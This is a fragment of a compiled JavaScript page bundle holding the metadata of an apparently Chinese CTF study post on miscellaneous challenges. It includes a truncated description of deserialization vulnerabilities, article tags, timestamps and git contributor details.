当应用程序对不可信数据源进行反序列化操作时，攻击者可构造恶意数据触发代码执行。反序列化漏洞的核心在于：反序列化过程会自动调用对象的..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-09-27T01:57:16.000Z"}],["meta",{"property":"article:tag","content":"杂项"}],["meta",{"property":"article:tag","content":"CTF"}],["meta",{"property":"article:modified_time","content":"2025-09-27T01:57:16.000Z"}]]},"readingTime":{"minutes":4.04,"words":1212},"git":{"createdTime":1758938236000,"updatedTime":1758938236000,"contributors":[{"name":"gaifagafin","username":"gaifagafin","email":"1454991831@qq.com","commits":1,"avatar":"https://avatars.githubusercontent.com/gaifagafin?v=4","url":"https://github.com/gaifagafin"}]},"autoDesc":true,"filePathRelative":"CTF/MISC杂项学习.md","headers":[],"categoryList":[{"id":"59db91","sort":10000,"name":"CTF"}]}`);export{p as comp,d as data};
